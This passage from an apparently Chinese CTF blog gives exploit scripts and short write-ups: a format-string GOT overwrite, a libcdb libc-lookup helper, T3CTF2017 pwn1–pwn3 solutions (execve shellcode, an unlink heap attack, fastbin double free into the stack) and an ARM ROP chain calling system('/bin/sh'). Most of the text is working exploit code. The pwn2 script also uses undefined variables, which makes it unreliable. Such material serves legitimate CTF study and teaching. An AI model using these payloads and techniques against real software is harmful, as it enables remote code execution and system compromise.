class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-08 21:08:57</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line">target = <span class="string">"./echo"</span></div><div class="line">rop = roputils.ROP(target)</div><div class="line">bss = rop.section(<span class="string">'.bss'</span>)+<span class="number">0x30</span></div><div class="line">printf_got = rop.got(<span class="string">'printf'</span>)</div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(target)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x80486C1\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sl</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.send(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="comment"># stage 1 get fmt offset</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exec_fmt</span><span class="params">(payload)</span>:</span></div><div class="line">	p = process(target)</div><div class="line">	p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	p.recvuntil(<span class="string">"input:"</span>)</div><div class="line">	p.sendline(payload)</div><div class="line">	<span class="keyword">return</span> p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>]</div><div class="line"></div><div class="line">autofmt = FmtStr(exec_fmt)</div><div class="line">offset = autofmt.offset</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_payload</span><span class="params">(payload)</span>:</span></div><div class="line">	ru(<span class="string">"input:"</span>)</div><div class="line">	sl(payload)</div><div class="line">	ru(<span class="string">"input:"</span>)</div><div class="line">	sl(<span class="string">"/bin/sh\x00"</span>)</div><div class="line"></div><div class="line"><span class="comment"># stage 2 get system_addr</span></div><div class="line"></div><div class="line">offset_system = [<span class="number">-63744</span>, <span class="number">-78400</span>, <span class="number">-55008</span>, <span class="number">-57072</span>, <span class="number">-55136</span>, <span class="number">-61392</span>, <span class="number">-55120</span>, <span class="number">-59840</span>, <span class="number">-64784</span>, <span class="number">-59456</span>, <span class="number">-58400</span>, <span class="number">-58480</span>, <span class="number">-60464</span>, <span class="number">-76112</span>, <span class="number">3792</span>, <span class="number">-70432</span>, <span class="number">-58160</span>, <span class="number">-1063904</span>, <span class="number">-1042576</span>, <span class="number">-1041936</span>, <span class="number">-68192</span>, <span class="number">-77448</span>, <span class="number">-51488</span>, <span class="number">-71904</span>]</div><div class="line"><span class="keyword">for</span> o <span class="keyword">in</span> offset_system:</div><div class="line">	<span class="keyword">try</span>:</div><div class="line">		p = process(target)</div><div class="line">		printf_got = rop.got(<span class="string">"printf"</span>)</div><div class="line">		puts_got = rop.got(<span class="string">"puts"</span>)</div><div class="line"></div><div class="line">		ru(<span class="string">"input:"</span>)</div><div class="line">		sl(p32(printf_got)+<span class="string">"%7$s"</span>)</div><div class="line">		ru(<span class="string">"input:"</span>)</div><div class="line">		sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">		printf_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line">		ru(<span class="string">"input:"</span>)</div><div class="line">		sl(p32(puts_got)+<span class="string">"%7$s"</span>)</div><div class="line">		ru(<span class="string">"input:"</span>)</div><div class="line">		sl(<span class="string">"payload"</span>)</div><div class="line"></div><div class="line">		puts_addr = u32(p.recv(<span class="number">8</span>)[<span class="number">4</span>:])</div><div class="line"></div><div class="line">		<span class="keyword">print</span> <span class="string">"printf_addr="</span>+hex(printf_addr)</div><div class="line">		<span class="keyword">print</span> <span class="string">"puts_addr="</span>+hex(puts_addr)</div><div class="line"></div><div class="line"></div><div class="line">		system_addr = printf_addr+o</div><div class="line"></div><div class="line">		<span class="comment"># stage 3 change printf_addr to system_addr</span></div><div class="line">		autofmt = FmtStr(send_payload,offset=offset)</div><div class="line">		autofmt.write(printf_got,system_addr)</div><div class="line">		autofmt.execute_writes()</div><div class="line">		<span class="comment"># print offset</span></div><div class="line">		<span class="comment"># print "bss_addr="+hex(bss)</span></div><div class="line">		<span class="comment"># payload = fmtstr_payload(1,&#123;bss:0xdeadbeaf&#125;,1,"byte")</span></div><div class="line">		<span class="comment"># print payload</span></div><div class="line"></div><div class="line">		p.interactive()</div><div class="line">	<span class="keyword">except</span>:</div><div class="line">		<span class="keyword">continue</span></div></pre></td></tr></table></figure>
<p>后记：啥时候出个FSP自动利用的啊。。</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> pwntools </tag>
            
            <tag> fmt </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[how_to_get_libc]]></title>
      <url>/2017/04/08/how-to-get-libc/</url>
      <content type="html"><![CDATA[<p>比赛的时候，遇到比较坑爹的情况，没有提供给libc库，这个时候就需要用各种姿势去泄露libc库。</p>
<p>1、询问组委会，是否提供libc库，很有可能就放提示了</p>
<p>2、通过return2libc技巧，泄露got内保存的库函数地址，去 <a href="http://libcdb.com/" target="_blank" rel="external">http://libcdb.com/</a>  找对应的库版本，这边我写了一个get_libc的小脚本（但并不是百分之一百能找到的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> re</div><div class="line"><span class="comment"># a_name = raw_input('input a_name= ')</span></div><div class="line"><span class="comment"># a_addr = raw_input('input a_addr=')</span></div><div class="line"><span class="comment"># b_name = raw_input('input b_name=')</span></div><div class="line"><span class="comment"># b_addr = raw_input('input b_addr=')</span></div><div class="line"><span class="comment"># a_name= 'read'</span></div><div class="line"><span class="comment"># a_addr='0xb76a9bd0'</span></div><div class="line"><span class="comment"># b_name='shutdown'</span></div><div class="line"><span class="comment"># b_addr='0xb76bc610'</span></div><div class="line">a_name=<span class="string">'printf'</span></div><div class="line">a_addr=<span class="string">'0x7f0ff5dadba0'</span></div><div class="line">b_name=<span class="string">'read'</span></div><div class="line">b_addr=<span class="string">'0x7f0ff5e50470'</span></div><div class="line"></div><div class="line">may_system_offset=[]</div><div class="line">url = <span class="string">'http://libcdb.com/search?symbolA='</span>+a_name+<span class="string">'&amp;addressA='</span>+a_addr+<span class="string">'&amp;symbolB='</span>+b_name+<span class="string">'&amp;addressB='</span>+b_addr</div><div class="line">r1 = get(url)</div><div class="line">list_ = re.findall(<span class="string">r'&lt;li&gt;&lt;a href="(.*?)"&gt;Libc\:'</span>,r1.content)</div><div class="line">payload = <span class="string">'may_system_offset = ['</span></div><div class="line"><span class="keyword">if</span> len(list_)&gt;<span class="number">0</span>:</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> list_:</div><div class="line">		url = <span class="string">'http://libcdb.com'</span>+x+<span class="string">'/symbols?name=__libc_system'</span></div><div class="line">		system_offset = get(url)</div><div class="line">		system_offset = re.findall(<span class="string">r'/dt&gt;\n        &lt;dd&gt;(.*?)&lt;/dd&gt;\n        \n    &lt;/dl&gt;'</span>,system_offset.content)[<span class="number">0</span>].replace(<span class="string">'libc_base + 0x'</span>,<span class="string">''</span>)</div><div class="line">		<span class="keyword">print</span> system_offset</div><div class="line">		url = <span class="string">'http://libcdb.com'</span>+x+<span class="string">'/symbols?name='</span>+b_name</div><div class="line">		func_offset = get(url)</div><div class="line">		<span class="comment"># print func_offset.content</span></div><div class="line">		func_offset = re.findall(<span class="string">r'&gt;'</span>+b_name+<span class="string">'&lt;/dt&gt;\n        &lt;dd&gt;(.*?)&lt;/dd&gt;'</span>,func_offset.content)[<span class="number">0</span>].replace(<span class="string">'libc_base + 0x'</span>,<span class="string">''</span>)</div><div class="line">		may_system_offset.append(int(system_offset,<span class="number">16</span>)-int(func_offset,<span class="number">16</span>))</div><div class="line">	may_system_offset = list(set(may_system_offset))</div><div class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> may_system_offset:</div><div class="line">		payload += hex(x)+<span class="string">','</span></div><div class="line">	payload = payload[:<span class="number">-1</span>]</div><div class="line">	<span class="keyword">print</span> payload+<span class="string">']'</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	<span class="keyword">print</span> <span class="string">'oops! nothing!'</span></div><div class="line">	</div><div class="line">raw_input()</div></pre></td></tr></table></figure>
<p>3、利用return to dl resolve技术，这个已经有成熟的辅助工具了。<a href="https://github.com/inaz2/roputils" target="_blank" rel="external">https://github.com/inaz2/roputils</a></p>
<p>4、利用其他题目的libc库，出题人为了方便，很有可能用的相同libc库</p>
<p>5、利用pwntools提供的dynelf函数来寻找system地址，不过需要有个leak函数。可参考 <a href="http://bobao.360.cn/learning/detail/3298.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3298.html</a> （蛋疼的是，不知道为啥我的ELF()函数一直是坏的。</p>
<hr>
<p>2017/5/23日添加</p>
<p>6、泄露Smallbin的FD、BK进行libc base获取</p>
]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[【pwn】T3CTF2017 堆溢出以及return to  dl slove]]></title>
      <url>/2017/04/08/T3CTF2017/</url>
      <content type="html"><![CDATA[<p>pwn1，没什么好说的，看了下checksec，NX没开，栈迁移以后直接执行bss上的shellcode就可以了。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</div><div class="line"><span class="keyword">import</span> pwn</div><div class="line"></div><div class="line">p = pwn.remote(<span class="string">"127.0.0.1"</span>,<span class="number">12346</span>)</div><div class="line">addr_bss = <span class="number">0x0804A080</span></div><div class="line">buf =  p32(<span class="number">0x0804A080</span>+<span class="number">4</span>)+<span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"</span></div><div class="line">buf += (<span class="number">0x1f4</span>-len(buf))*<span class="string">'a'</span></div><div class="line">p.send(buf)</div><div class="line"></div><div class="line"></div><div class="line">buf = <span class="string">'a'</span>*<span class="number">504</span></div><div class="line">buf += p32(<span class="number">0x0804A080</span>+<span class="number">4</span>)</div><div class="line">p.sendline(buf)</div><div class="line">data = p.recvuntil(<span class="string">"\n"</span>)</div><div class="line">p.sendline(<span class="string">"cat /lib/x86_64-linux-gnu/libc.so.6"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>pwn2的libc可以从pwn1中获取。非常经典的double free教学题。可以参考 <a href="http://www.tuicool.com/articles/yquU732" target="_blank" rel="external">http://www.tuicool.com/articles/yquU732</a> （double free浅析，乌云的文章）</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-07 19:09:17</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"></div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">0</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./pwn2'</span>)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x0400A6D\nc")</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	p = remote(<span class="string">"120.27.248.138"</span>,<span class="number">12345</span>)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,length,data)</span>:</span></div><div class="line">	ru(<span class="string">"the action:"</span>)</div><div class="line">	sd(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"note index:\n"</span>)</div><div class="line">	sd(str(index))</div><div class="line">	ru(<span class="string">" of the new note:\n"</span>)</div><div class="line">	sd(str(length))</div><div class="line">	ru(<span class="string">"ts of note:"</span>)</div><div class="line">	sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"the action:"</span>)</div><div class="line">	sd(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"ter the note index:"</span>)</div><div class="line">	sd(str(index))</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,length,data)</span>:</span></div><div class="line">	ru(<span class="string">"the action:"</span>)</div><div class="line">	sd(<span class="string">"3"</span>)</div><div class="line">	ru(<span class="string">" note index:"</span>)</div><div class="line">	sd(str(index))</div><div class="line">	ru(<span class="string">" new note:"</span>)</div><div class="line">	sd(str(length))</div><div class="line">	ru(<span class="string">"of note:\n"</span>)</div><div class="line">	sd(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"the action:"</span>)</div><div class="line">	sd(<span class="string">"4"</span>)</div><div class="line">	ru(<span class="string">" note index:"</span>)</div><div class="line">	sd(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_anyaddr</span><span class="params">(addr,data)</span>:</span></div><div class="line">	payload = <span class="string">'\x00'</span>*<span class="number">0x18</span>+p64(<span class="number">0x6020a8</span>)+p64(<span class="number">0</span>)+p64(addr)</div><div class="line">	edit(<span class="number">0</span>,len(payload),payload)</div><div class="line">	edit(<span class="number">2</span>,len(data),data)</div><div class="line"></div><div class="line">add(<span class="number">0</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">1</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">2</span>,<span class="number">512</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">3</span>,<span class="number">512</span>,<span class="string">"/bin/sh\x00"</span>)</div><div class="line">head = p64(<span class="number">0</span>)+p64(<span class="number">1</span>+<span class="number">512</span>)</div><div class="line">fd = p64(<span class="number">0x6020C0</span> - <span class="number">0x18</span>)</div><div class="line">bk = p64(<span class="number">0x6020C0</span> - <span class="number">0x10</span>)</div><div class="line">payload =  head+fd+bk</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">512</span>-len(payload))</div><div class="line">payload += p64(<span class="number">512</span>)+p64(<span class="number">512</span>+<span class="number">0x10</span>)</div><div class="line">payload += <span class="string">"a"</span>*(<span class="number">600</span>-len(payload))</div><div class="line">edit(<span class="number">0</span>,<span class="number">600</span>,payload)</div><div class="line">dele(<span class="number">1</span>)</div><div class="line"></div><div class="line">free_got = <span class="number">0x602018</span></div><div class="line">edit_anyaddr(<span class="number">0x6020C0</span>+<span class="number">0x20</span>,p64(puts_got))</div><div class="line">show(<span class="number">4</span>)</div><div class="line">free_addr = u64(ru(<span class="string">"\n"</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"free_addr="</span>+hex(free_addr)</div><div class="line"></div><div class="line">offset = <span class="number">0x83940</span><span class="number">-0x45390</span></div><div class="line">system_addr = puts_addr - offset</div><div class="line">edit_anyaddr(<span class="number">0x602018</span>,p64(system_addr))</div><div class="line">dele(<span class="number">3</span>)</div><div class="line">p.interactive()</div><div class="line"></div><div class="line"><span class="comment">#flag&#123;038a6d27a716d1e1472b1eded07c385d&#125;</span></div></pre></td></tr></table></figure>
<p>pwn3是fastbin double free attack的考察点，要利用这个攻击我们需要伪造出一个fake fastbin出来,所幸题目给予了所有的攻击条件。</p>
<p>可参考 <a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c" target="_blank" rel="external">https://github.com/shellphish/how2heap/blob/master/fastbin_dup_into_stack.c</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python</span></div><div class="line"><span class="comment"># -*- coding: utf-8 -*-</span></div><div class="line"><span class="comment"># @Date    : 2017-04-07 19:09:17</span></div><div class="line"><span class="comment"># @Author  : WinterSun (511683586@qq.com)</span></div><div class="line"><span class="comment"># @Link    : https://Winter3un.github.io/</span></div><div class="line"><span class="keyword">import</span> roputils</div><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">DEBUG = <span class="number">1</span></div><div class="line"></div><div class="line"><span class="keyword">if</span> DEBUG:</div><div class="line">	p = process(<span class="string">'./pwn3'</span>)</div><div class="line">	<span class="comment"># gdb.attach(p,"b*0x4009da\nc")</span></div><div class="line"><span class="comment"># else:</span></div><div class="line"><span class="comment"># 	p = remote()</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sd</span><span class="params">(data)</span>:</span></div><div class="line">	p.sendline(data)</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ru</span><span class="params">(data)</span>:</span></div><div class="line">	<span class="keyword">return</span> p.recvuntil(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span><span class="params">(data)</span>:</span></div><div class="line">	ru(<span class="string">"name\n"</span>)</div><div class="line">	sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(index,length,data)</span>:</span></div><div class="line">	ru(<span class="string">"delete paper\n"</span>)</div><div class="line">	sd(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"o store(0-9):"</span>)</div><div class="line">	sd(str(index))</div><div class="line">	ru(<span class="string">"ill enter:"</span>)</div><div class="line">	sd(str(length))</div><div class="line">	ru(<span class="string">"our content:"</span>)</div><div class="line">	sd(data)</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span><span class="params">(index,length,data)</span>:</span></div><div class="line">	sd(<span class="string">"1"</span>)</div><div class="line">	ru(<span class="string">"o store(0-9):"</span>)</div><div class="line">	sd(str(index))</div><div class="line">	ru(<span class="string">"ill enter:"</span>)</div><div class="line">	sd(str(length))</div><div class="line">	ru(<span class="string">"our content:"</span>)</div><div class="line">	sd(data)</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(index)</span>:</span></div><div class="line">	ru(<span class="string">"delete paper\n"</span>)</div><div class="line">	sd(<span class="string">"2"</span>)</div><div class="line">	ru(<span class="string">"index(0-9):"</span>)</div><div class="line">	sd(str(index))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">setsize</span><span class="params">(size)</span>:</span></div><div class="line">	ru(<span class="string">"delete paper\n"</span>)</div><div class="line">	sd(<span class="string">"3"</span>)</div><div class="line">	ru(<span class="string">"number:"</span>)</div><div class="line">	sd(str(size))</div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></div><div class="line">	ru(<span class="string">"delete paper\n"</span>)</div><div class="line">	sd(<span class="string">"a"</span>*(<span class="number">0x30</span>))</div><div class="line">	ru(<span class="string">"\n"</span>)</div><div class="line">	sd(<span class="string">"a"</span>*(<span class="number">0x30</span>))</div><div class="line">	<span class="keyword">return</span> u64(ru(<span class="string">"\n"</span>)[<span class="number">0x30</span>:<span class="number">0x30</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">"\x00"</span>))</div><div class="line"></div><div class="line">buf =  <span class="string">""</span></div><div class="line">buf += <span class="string">"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68"</span></div><div class="line">buf += <span class="string">"\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6"</span></div><div class="line">buf += <span class="string">"\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68"</span></div><div class="line">buf += <span class="string">"\x00\x56\x57\x48\x89\xe6\x0f\x05"</span></div><div class="line"></div><div class="line">shellcode = buf</div><div class="line">shellcode_addr = <span class="number">0x6020c0</span></div><div class="line"></div><div class="line">welcome(shellcode)</div><div class="line">setsize(<span class="number">0x30</span>)</div><div class="line">stack_addr = leak_stack()</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">print</span> <span class="string">"stack_addr="</span>+hex(stack_addr)</div><div class="line">offset = <span class="number">0x7ffcfca53d30</span> - <span class="number">0x00007ffcfca53c20</span> </div><div class="line">target_addr = stack_addr-offset<span class="number">-0x8</span></div><div class="line"><span class="keyword">print</span> <span class="string">"offset = "</span>+hex(offset)</div><div class="line"><span class="keyword">print</span> <span class="string">"target_addr = "</span>+hex(target_addr)</div><div class="line"></div><div class="line">add2(<span class="number">0</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">dele(<span class="number">0</span>)</div><div class="line">dele(<span class="number">1</span>)</div><div class="line">dele(<span class="number">0</span>)<span class="comment">#a-b-a</span></div><div class="line">add(<span class="number">0</span>,<span class="number">0x20</span>,p64(target_addr))</div><div class="line">add(<span class="number">1</span>,<span class="number">0x20</span>,<span class="string">"aaa"</span>)</div><div class="line">add(<span class="number">2</span>,<span class="number">0x20</span>,p64(target_addr))</div><div class="line">payload = <span class="string">"a"</span>*<span class="number">0x10</span>+p64(shellcode_addr)</div><div class="line">add(<span class="number">3</span>,<span class="number">0x20</span>,payload)</div><div class="line">sd(<span class="string">"4"</span>)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        
        <tags>
            
            <tag> pwn </tag>
            
            <tag> heap overflow </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[ARM环境下栈溢出攻击初探]]></title>
      <url>/2017/04/07/ARM-overflow/</url>
      <content type="html"><![CDATA[<p>题目来自于2016年全国高校网安联赛pwn专场。</p>
<p>参考文献：<a href="http://www.freebuf.com/articles/terminal/107276.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/107276.html</a></p>
<p>其中有一题warmup的题目，常规思路，使用file命令查看该文件格式，发现是arm下静态文件，之后常规考虑用ROPgadget生成ropchain，放入栈中执行，但是这边有区别，arm是以r0寄存器存放第一个函数参数的。所以我们需要手工构造ropchain，首先去找system函数，虽然该bin文件去符号化了，但是由于存在/bin/sh字符串，跟踪一下就发现了如下函数。</p>
<p>这不就是system函数么。。。</p>
<p>接着用ROPgadget来找一个控制r0寄存器的ropchain就可以了。。如下命令</p>
<p><code>ROPgadget --binary warmup --only &quot;pop&quot;|grep r0</code></p>
<p>找到了</p>
<p><code>0x00020904 : pop {r0, r4, pc}</code></p>
<p>接着就剩下构造ropchian并执行了，如下脚本。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</div><div class="line">context(log_level=<span class="string">"debug"</span>)</div><div class="line">p = process(<span class="string">'./warmup'</span>)</div><div class="line">p.recvuntil(<span class="string">'\n'</span>)</div><div class="line">p.sendline()</div><div class="line">raw_input()</div><div class="line">pr0_pr4_ret  =<span class="number">0x00020904</span></div><div class="line">bin_sh = <span class="number">0x6C384</span></div><div class="line">system = <span class="number">0x110B4</span></div><div class="line">payload = p32(pr0_pr4_ret)+p32(bin_sh)+p32(<span class="number">0</span>)+p32(system)</div><div class="line">p.sendline(<span class="string">'a'</span>*<span class="number">0x70</span>+payload)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>
<p>另一题login，模糊测试一下直接出payload。</p>
